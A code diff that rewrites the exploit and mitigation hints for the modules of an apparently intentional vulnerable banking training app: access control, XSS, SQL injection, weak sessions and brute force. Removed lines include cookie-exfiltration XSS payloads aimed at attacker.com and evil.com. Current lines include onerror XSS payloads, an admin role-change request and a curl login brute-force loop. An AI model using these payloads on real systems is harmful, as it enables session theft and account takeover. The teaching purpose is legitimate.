@@ -22,127 +22,127 @@ import { useVulnerabilities } from '../hooks/useVulnerabilities'
 // Static educational content for each module, keyed by module ID (matches DEFAULT_MODULES ids)
 const MODULE_CONTENT = {
     bola: {
-        owaspWeb: 'A01:2025 – Broken Access Control',
-        owaspApi: 'API1:2023 – Broken Object Level Authorization',
+        owaspWeb: 'A01:2025 - Broken Access Control',
+        owaspApi: 'API1:2023 - Broken Object Level Authorization',
         description:
-            'BOLA occurs when an API endpoint accepts a user-controlled object ID (such as an account number in the URL) but never verifies that the requesting user actually owns that object. An attacker who knows or can guess another user\'s ID can read or modify their data without any special privileges.',
+            'BOLA occurs when an API endpoint accepts a user-controlled object ID but authorizes the request against the wrong identity. An authenticated user can supply another account UUID and read data that should belong only to that account owner.',
         howItWorks:
-            'GET /api/accounts/:id returns full account data for any valid numeric ID. No ownership check is performed in vulnerable mode.',
+            'GET /api/accounts/:id accepts an account UUID. In vulnerable mode the server looks up the account owner from the requested ID, binds the RLS session to that owner, and returns the account with ownerId and vulnerableMode. In hardened mode cross-user reads return 404.',
         exploitHints: [
-            'Log in and note your own account ID from the URL or API response.',
-            'Change the :id path parameter to a different number (e.g., increment by 1).',
-            'Observe whether the server returns another user\'s balance and transaction history.',
-            'Enumerate IDs 1–20 with curl or a browser to map all accounts.',
+            'Log in and capture your auth cookie from the browser session.',
+            'Find or guess another account UUID from seeded data or another API response.',
+            'Request GET /api/accounts/<victim-account-uuid> while authenticated as your own user.',
+            'In vulnerable mode, confirm the response exposes another account\'s balance plus ownerId and vulnerableMode.',
         ],
         mitigationHints: [
-            'On every request, compare req.user.id against the account\'s owner_id in the database.',
-            'Return 403 Forbidden (not 404) when a valid user requests a resource they don\'t own, 404 leaks existence.',
+            'Bind database reads to the authenticated user, not to an ID supplied in the request.',
+            'After loading an account, compare account.userId to req.user.userId before returning it.',
+            'Return a generic 404 for cross-user reads so the endpoint does not confirm whether a UUID exists.',
             'Prefer non-sequential UUIDs over integer IDs to make enumeration impractical.',
-            'Never trust the client to enforce ownership, the server is the only authority.',
         ],
-        payloadExample: 'GET /api/accounts/3  (while your own account ID is 7)',
+        payloadExample: 'GET /api/accounts/00000000-0000-0000-0000-000000000000',
     },
 
     privilege_escalation: {
-        owaspWeb: 'A01:2025 – Broken Access Control',
-        owaspApi: 'API5:2023 – Broken Function Level Authorization',
+        owaspWeb: 'A01:2025 - Broken Access Control',
+        owaspApi: 'API5:2023 - Broken Function Level Authorization',
         description:
-            'Privilege escalation happens when admin-only routes or functionality exist on the server but are protected only by the UI hiding a link, not by server-side role enforcement. Any user who knows the endpoint URL can call it directly.',
+            'Privilege escalation happens when a user can reach functionality reserved for a higher role. The UI may hide admin actions, but the server must still enforce the role on every admin endpoint.',
         howItWorks:
-            'In vulnerable mode, /api/admin/users has no role-checking middleware. The server returns admin data to any authenticated request, regardless of role.',
+            'The admin routes use role middleware. When privilege_escalation is enabled, that middleware intentionally bypasses the admin-role check and lets any authenticated user call /api/admin/users, /api/admin/users/:id, and /api/admin/users/:id/role.',
         exploitHints: [
             'Log in as a regular user (not admin) and navigate directly to /admin in the browser.',
-            'In vulnerable mode the page loads and the API returns all user data.',
-            'Use curl with your regular user\'s JWT: curl -H "Authorization: Bearer <token>" /api/admin/users',
-            'Inspect the JWT payload at jwt.io, note your role is "user", not "admin".',
+            'In vulnerable mode, confirm the page can load user management data.',
+            'Call GET /api/admin/users with your normal authenticated browser session.',
+            'Try PATCH /api/admin/users/:id/role with { "role": "admin" } to test whether role-changing functions are also exposed.',
         ],
         mitigationHints: [
-            'Add role-checking middleware to every admin route: reject requests where req.user.role !== "admin".',
-            'Never rely on the frontend to hide admin UI, a determined user will bypass it.',
-            'Return 403 Forbidden for unauthorized role access; do not return 404 (leaks route existence).',
+            'Keep role-checking middleware on every admin route and fail closed when the role is not admin.',
+            'Never rely on hidden frontend links as the access-control boundary.',
+            'Return 403 Forbidden for authenticated users who do not have the required role.',
             'Keep an explicit access-control matrix: document which role is required for every endpoint.',
         ],
-        payloadExample: 'GET /api/admin/users  with Authorization: Bearer <regular-user-JWT>',
+        payloadExample: 'PATCH /api/admin/users/<user-uuid>/role  { "role": "admin" }',
     },
 
     excessive_data_exposure: {
-        owaspWeb: 'A01:2025 – Broken Access Control',
-        owaspApi: 'API3:2023 – Broken Object Property Level Authorization',
+        owaspWeb: '',
+        owaspApi: 'API3:2023 - Broken Object Property Level Authorization',
         description:
-            'Excessive data exposure occurs when an API returns full database objects, including sensitive fields the client never displays. Mass assignment compounds this: if POST/PUT bodies are trusted blindly, an attacker can write fields they should never control, like isAdmin.',
+            'Excessive data exposure occurs when an API returns fields the client does not need. Mass assignment is the matching write-side problem: an endpoint accepts properties that the user should never control, such as an admin flag.',
         howItWorks:
-            'In vulnerable mode, GET /api/account includes internal fields like isAdmin and creditScore. POST /api/users/profile accepts and saves any field in the body, including isAdmin:true.',
+            'In vulnerable mode, GET /api/accounts/me returns extra account and nested user fields, including userId, role, email, and passwordBcrypt. PUT /api/accounts/me accepts isAdmin:true and promotes the current user to admin.',
         exploitHints: [
-            'Call GET /api/account and inspect the full JSON response, look beyond the fields displayed in the UI.',
-            'Search the response for fields like isAdmin, creditScore, passwordHash, or internalId.',
-            'Send a POST /api/users/profile request with { "isAdmin": true } in the body.',
-            'Refresh the page and check whether your role or accessible routes have changed.',
+            'Call GET /api/accounts/me and inspect the full JSON response, not just the fields shown in the UI.',
+            'Look for nested user properties such as passwordBcrypt, role, email, and userId.',
+            'Send PUT /api/accounts/me with { "isAdmin": true } in the request body.',
+            'Refresh the app and check whether admin routes or role-dependent controls become available.',
         ],
         mitigationHints: [
             'Use Data Transfer Objects (DTOs), serialize only the specific fields each view needs.',
             'Validate all incoming request bodies against an allowlist schema; reject unknown fields like isAdmin.',
-            'Never expose role flags, hashed passwords, or internal IDs in any API response.',
-            'Audit every API response: document what fields each consumer actually requires.',
+            'Never expose password hashes or role-management fields in ordinary account responses.',
+            'Keep profile/account update endpoints scoped to user-editable fields such as name and email.',
         ],
-        payloadExample: 'POST /api/users/profile  { "username": "alice", "isAdmin": true }',
+        payloadExample: 'PUT /api/accounts/me  { "isAdmin": true }',
     },
 
     verbose_errors: {
-        owaspWeb: 'A02:2025 – Security Misconfiguration',
-        owaspApi: 'API8:2023 – Security Misconfiguration',
+        owaspWeb: 'A05:2025 - Security Misconfiguration',
+        owaspApi: 'API8:2023 - Security Misconfiguration',
         description:
             'When a server returns stack traces, raw SQL queries, or internal file paths in its error responses, attackers receive a detailed map of the system\'s internals, revealing table names, column names, framework versions, and server paths that make targeted attacks far more precise.',
         howItWorks:
-            'In vulnerable mode, the Express global error handler passes the raw Error object (including stack and SQL fragments) directly into the JSON response body.',
+            'In vulnerable mode, the Express error handler adds debugging detail such as stack, detail, hint, and query text to the structured JSON error response. Hardened mode keeps the client response limited to status, message, and code.',
         exploitHints: [
-            'Trigger a server error by sending a malformed request, such as a non-integer account ID.',
-            'Inspect the 500 response body for stack traces, file paths, or SQL query fragments.',
-            'Use revealed table names and column names to craft more precise SQL injection payloads.',
-            'Look for X-Powered-By headers or version strings in the response that hint at known CVEs.',
+            'Trigger a server error with a request that reaches the error handler, such as an unmatched test route in the API.',
+            'Inspect the JSON error body for stack, detail, hint, or query fields.',
+            'Use revealed table names, column names, and file paths to make follow-up attacks more precise.',
+            'Compare the vulnerable response with hardened mode to confirm the extra diagnostic fields disappear.',
         ],
         mitigationHints: [
-            'The global error handler must return only a generic message ("Something went wrong") and a unique log ID.',
+            'Return a structured but minimal client error response with status, message, and code.',
             'Log the full error detail server-side (to a file or logging service), never to the client.',
             'Set NODE_ENV=production to disable Express\'s default verbose error middleware.',
             'Remove the X-Powered-By header and any other framework fingerprinting headers.',
         ],
-        payloadExample: 'GET /api/accounts/abc  (non-integer triggers a DB cast error with full trace)',
+        payloadExample: 'GET /api/dummy-route',
     },
 
     weak_password_storage: {
-        owaspWeb: 'A07:2025 – Identification and Authentication Failures',
-        owaspApi: 'API2:2023 – Broken Authentication',
+        owaspWeb: 'A02:2025 - Cryptographic Failures',
+        owaspApi: 'API2:2023 - Broken Authentication',
         description:
             'Storing passwords as plaintext or with weak, unsalted hashes (MD5, SHA-1) means a single database breach exposes every user\'s password, either directly or within seconds via precomputed rainbow tables. A breach that would be contained becomes a full credential dump.',
         howItWorks:
-            'In vulnerable mode, registration stores the password as plaintext or an unsalted MD5 hash. In hardened mode, bcrypt with a per-user salt (cost factor ≥ 12) is used instead.',
+            'In vulnerable mode, registration keeps plaintext and MD5 password material alongside the bcrypt value and returns hashInfo to make the weakness visible in the demo. Hardened mode relies on bcrypt and does not expose weak password material in auth responses.',
         exploitHints: [
-            'Query the users table directly and inspect the password column.',
-            'A 32-character hex string is MD5, paste it into a site like crackstation.net to crack it instantly.',
-            'A plaintext password needs no cracking at all.',
-            'Compare hash formats: MD5 is 32 hex chars, bcrypt starts with $2b$ and is 60 chars.',
+            'Register or log in while the module is vulnerable and inspect the response hashInfo.',
+            'Query the users table directly and compare password_plaintext, password_md5, and password_bcrypt.',
+            'A 32-character hex string is MD5 and can usually be cracked quickly for common passwords.',
+            'Compare hash formats: MD5 is 32 hex chars, while bcrypt starts with $2b$ and includes its salt and cost.',
         ],
         mitigationHints: [
-            'Always use bcrypt (or Argon2id) with a cost factor of at least 12 for new password storage.',
+            'Use a slow password hashing algorithm such as bcrypt or Argon2id for password verification.',
             'bcrypt automatically generates and stores a unique salt per hash, never reuse salts.',
-            'Never store passwords in plaintext or with reversible encryption.',
-            'Consider adding a server-side pepper (HMAC with a secret key) as an additional layer.',
+            'Never store passwords in plaintext, with fast unsalted hashes, or with reversible encryption.',
+            'Do not return password hash diagnostics from production login or registration responses.',
         ],
-        payloadExample: "SELECT password FROM users WHERE username = 'alice' and compare hash format",
+        payloadExample: "POST /api/auth/login  { \"identifier\": \"test_user\", \"password\": \"Password123\" }",
     },
 
     sql_injection: {
-        owaspWeb: 'A05:2025 – Injection',
-        owaspApi: 'API8:2023 – Security Misconfiguration',
+        owaspWeb: 'A03:2025 - Injection',
+        owaspApi: '',
         description:
             'SQL injection occurs when user input is concatenated directly into a SQL query string. An attacker can break out of the intended query context and read, modify, or delete arbitrary data, or bypass authentication entirely with a single carefully crafted string.',
         howItWorks:
-            'The transaction history search endpoint builds its WHERE clause via string concatenation in vulnerable mode: WHERE description LIKE \'%\' + input + \'%\'. Hardened mode uses a parameterized query.',
+            'This module is represented in the toggle list, but current main does not yet expose a working SQL injection route. The transaction history search is client-side filtering, and GET /api/transfers only accepts a type filter.',
         exploitHints: [
-            "Enter a single quote (') in the search bar, if the query breaks with an error, injection is confirmed.",
-            "Try: ' OR '1'='1; if all transactions appear for all users, injection is working.",
-            "Use UNION SELECT to pull data from other tables: ' UNION SELECT username, password, null FROM users --",
-            "Comment out trailing query conditions with -- or /* */ to neutralize them.",
+            'Do not treat the History page search box as a SQL injection target on current main.',
+            'Use this page as a placeholder for the planned module until a backend route intentionally concatenates input.',
+            'When implemented, test with a harmless single quote first and verify the vulnerable route is isolated from destructive database permissions.',
+            'Keep demo payloads read-only so the training app remains recoverable.',
         ],
         mitigationHints: [
             'Use parameterized queries (prepared statements) for every database query, never concatenate user input.',
@@ -150,25 +150,25 @@ const MODULE_CONTENT = {
             'Input validation is a secondary layer, not a primary defense, parameterization is the fix.',
             'Use a least-privilege DB account: the app role should not have DROP, CREATE, or GRANT permissions.',
         ],
-        payloadExample: "' OR '1'='1",
+        payloadExample: 'Planned demo payload: \' OR \'1\'=\'1',
     },
 
     xss_stored: {
-        owaspWeb: 'A05:2025 – Injection',
-        owaspApi: 'API8:2023 – Security Misconfiguration',
+        owaspWeb: 'A03:2025 - Injection',
+        owaspApi: '',
         description:
-            'Stored XSS occurs when user-supplied input containing a script tag is saved to the database and later rendered without encoding. Every user who views the affected page runs the attacker\'s script in their own browser, silently and without any interaction beyond visiting the page.',
+            'Stored XSS occurs when user-supplied HTML is saved and later rendered without encoding. Every user who views the affected page can execute attacker-controlled browser code.',
         howItWorks:
-            'Transaction memo fields are stored as-is and later rendered with dangerouslySetInnerHTML in vulnerable mode, causing any embedded scripts to execute when the history page loads.',
+            'Transfer memo/reference text is stored with the transaction. When xss_stored is enabled, the History page transaction description and Transfer page recent memo render that value with dangerouslySetInnerHTML.',
         exploitHints: [
-            'Submit a transfer with the memo: <script>alert("XSS")</script>',
-            'Navigate to the Transaction History page, the script executes on load.',
-            'For a realistic attack, exfiltrate the session cookie: <script>fetch("https://attacker.com?c="+document.cookie)</script>',
-            'Try HTML event handlers without a script tag: <img src=x onerror=alert(1)>',
+            'Submit a transfer with an HTML event-handler payload in the memo field.',
+            'Navigate to Transaction History and inspect whether the memo executes when rendered.',
+            'Return to Transfer and check the recent-transfer memo rendering path too.',
+            'Try payloads that do not rely on script tags, such as <img src=x onerror=alert(1)>.',
         ],
         mitigationHints: [
             "Use React's default JSX rendering, it auto-escapes all output. Avoid dangerouslySetInnerHTML.",
-            'If rich HTML must be rendered, sanitize it server-side with a library like DOMPurify before storage.',
+            'If rich HTML must be rendered, sanitize it with a library such as DOMPurify before display.',
             'Set a strict Content Security Policy (CSP) header to block inline scripts.',
             'Mark session cookies as HttpOnly so scripts cannot read them even if XSS succeeds.',
         ],
@@ -176,72 +176,71 @@ const MODULE_CONTENT = {
     },
 
     xss_reflected: {
-        owaspWeb: 'A05:2025 – Injection',
-        owaspApi: 'API8:2023 – Security Misconfiguration',
+        owaspWeb: 'A03:2025 - Injection',
+        owaspApi: '',
         description:
-            'Reflected XSS injects a script payload via a URL parameter. The application reflects the parameter back into the page without encoding, executing the attacker\'s script in the victim\'s browser the moment they click a crafted link, no account or login required from the attacker\'s side.',
+            'Reflected XSS injects a payload through a request or URL and immediately reflects it into a page without encoding. The victim must load the crafted request while authenticated for protected FauxVault pages.',
         howItWorks:
-            'The History page reads the ?q= URL parameter and reflects it into the DOM using dangerouslySetInnerHTML when displaying "search results." The phishing email button in the panel demonstrates a realistic delivery vector.',
+            'The History page reads the ?q= URL parameter and, when xss_reflected is enabled, renders the matching-search label with dangerouslySetInnerHTML. The transfer flow also echoes an invalid toAccountId in vulnerable mode, and TransferPage renders that server error as HTML.',
         exploitHints: [
-            'Append a script payload to the search URL: /history?q=<script>alert(1)</script>',
-            'Use the phishing email button in the vulnerability panel, it demonstrates link-based delivery.',
-            'Craft a cookie-stealing URL: /history?q=<script>document.location="https://evil.com?c="+document.cookie</script>',
-            'Try URL-encoding to bypass naive filters: /history?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E',
+            'While logged in, append an HTML payload to the search URL: /history?q=<img src=x onerror=alert(1)>.',
+            'Use the phishing email button in the vulnerability panel to demonstrate link-based delivery.',
+            'Submit a transfer with an invalid toAccountId containing markup and observe the reflected error path.',
+            'Try URL-encoding the payload if the browser or tooling rewrites special characters.',
         ],
         mitigationHints: [
             'Never reflect URL parameters directly into the DOM, read them into React state and render with JSX.',
             "React's JSX rendering escapes all values by default; dangerouslySetInnerHTML bypasses this intentionally.",
             'A strict Content Security Policy (CSP) with nonce-based script allowlisting blocks most reflected XSS.',
-            'Validate and sanitize query parameters server-side before including them in any API response.',
+            'Keep server validation errors generic; do not echo raw invalid values back into HTML-rendered UI.',
         ],
         payloadExample: '/history?q=<img src=x onerror=alert(document.cookie)>',
     },
 
     weak_session_tokens: {
-        owaspWeb: 'A04:2025 – Cryptographic Failures',
-        owaspApi: 'API2:2023 – Broken Authentication',
+        owaspWeb: 'A07:2025 - Identification and Authentication Failures',
+        owaspApi: 'API2:2023 - Broken Authentication',
         description:
-            'Cookies without HttpOnly can be read by JavaScript, enabling theft via XSS. Without Secure, they are sent over plain HTTP. A JWT signed with a trivially weak secret can be forged by anyone who knows the secret. The Session Inspector on the Dashboard lets you observe all of these flags in real time.',
+            'Weak session handling exposes tokens to theft or replay. Cookies without HttpOnly can be read by JavaScript, weaker SameSite settings increase cross-site risk, and returning tokens in response bodies makes them easier to leak.',
         howItWorks:
-            'In vulnerable mode, the JWT is signed with a weak secret (e.g., "secret") and the response cookie lacks HttpOnly, Secure, and SameSite flags. The Session Inspector on the Dashboard displays the live flag state.',
+            'In vulnerable mode, login returns token in the JSON response and sets a cookie with HttpOnly=false, Secure=false, and SameSite=Lax. Hardened mode omits the body token and uses an HttpOnly cookie with SameSite=Strict; Secure is enabled in production.',
         exploitHints: [
-            'Open DevTools → Application → Cookies and check for missing Secure and HttpOnly attributes.',
+            'Open DevTools -> Application -> Cookies and check the token cookie flags.',
             'Run document.cookie in the browser console, if the token appears, HttpOnly is absent.',
-            'Paste your JWT into jwt.io and inspect the algorithm and payload claims.',
-            'With a known weak secret, sign a modified payload with an elevated role claim and replay it.',
+            'Inspect the login JSON response; in vulnerable mode it includes token, while hardened mode does not.',
+            'Use the Session Inspector on the Dashboard to compare the live flag state after toggling the module.',
         ],
         mitigationHints: [
             'Set HttpOnly=true on all session cookies, JavaScript must never be able to read them.',
-            'Set Secure=true so cookies are only transmitted over HTTPS.',
+            'Set Secure=true in production so cookies are only transmitted over HTTPS.',
             'Set SameSite=Strict to prevent the cookie from being sent on cross-origin requests.',
             'Use a cryptographically random JWT secret of at least 256 bits.',
-            'Set short JWT expiration (15–60 min) and implement refresh token rotation.',
+            'Do not return bearer tokens in response bodies when cookie-only auth is intended.',
         ],
-        payloadExample: 'document.cookie  →  reveals token value if HttpOnly flag is missing',
+        payloadExample: 'document.cookie  ->  reveals token value if HttpOnly is missing',
     },
 
     brute_force: {
-        owaspWeb: 'A07:2025 – Identification and Authentication Failures',
-        owaspApi: 'API4:2023 – Unrestricted Resource Consumption',
+        owaspWeb: 'A07:2025 - Identification and Authentication Failures',
+        owaspApi: 'API4:2023 - Unrestricted Resource Consumption',
         description:
-            'Without rate limiting or account lockout, the login endpoint accepts unlimited password attempts at machine speed. An automated script can try tens of thousands of passwords per minute against any account, turning a guessable or leaked password into a certain breach.',
+            'Without effective rate limiting, the login endpoint accepts too many password attempts from the same source. Automated scripts can turn weak or reused passwords into account compromise.',
         howItWorks:
-            'In vulnerable mode, /api/auth/login imposes no rate limit, no lockout, and no delay between failures. Hardened mode adds IP-based rate limiting (express-rate-limit) and an account lockout after 5 consecutive failures.',
+            'POST /api/auth/login uses identifier and password. Hardened mode enforces the strict brute-force limiter: 5 login requests per 5 minutes per IP. Vulnerable mode skips that strict limiter, while an always-on auth safety net still caps all auth routes at 100 requests per minute per IP.',
         exploitHints: [
             'Use curl in a shell loop to submit rapid-fire login attempts with a wordlist.',
             'A list of the 100 most common passwords cracks most accounts with weak credentials.',
-            'Observe that no lockout, CAPTCHA, or delay is applied regardless of failure count.',
-            "Try: for i in $(seq 1 50); do curl -s -X POST /api/auth/login -d '{\"username\":\"alice@test.com\",\"password\":\"pass$i\"}'; done",
+            'Compare hardened and vulnerable modes to see when the 5-per-5-minutes login limiter blocks requests.',
+            'Use identifier, not username, in the login JSON body.',
         ],
         mitigationHints: [
-            'Use express-rate-limit to cap login attempts to 5 per IP per 15-minute window.',
-            'Lock the account after 5 consecutive failures and require email-based unlock.',
-            'Add exponential backoff: each failed attempt increases the delay before the next is accepted.',
-            'After 3 failures, require CAPTCHA to block automated scripts.',
+            'Use express-rate-limit or equivalent middleware to cap login attempts per IP and time window; this app uses 5 attempts per 5 minutes.',
+            'Keep a safety-net limiter active even when demonstrating weaker controls; this app also keeps a 100-per-minute auth cap.',
+            'Use generic login failures so attackers cannot enumerate accounts.',
             'Log all failed login attempts and alert on suspicious volume from a single IP.',
         ],
         payloadExample:
-            "for i in $(seq 1 100); do curl -sX POST /api/auth/login -d '{\"username\":\"target@test.com\",\"password\":\"pass$i\"}'; done",
+            "for i in $(seq 1 50); do curl -sX POST /api/auth/login -H 'Content-Type: application/json' -d '{\"identifier\":\"test_user\",\"password\":\"pass'$i'\"}'; done",
     },
 }
 
@@ -357,7 +356,7 @@ export default function ModulePage() {
                             {mod.name}
                         </Typography>
                         <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
-                            <OwaspChip label={content.owaspWeb} />
+                            {content.owaspWeb && <OwaspChip label={content.owaspWeb} />}
                             {content.owaspApi && <OwaspChip label={content.owaspApi} />}
                         </Box>
                     </Box>
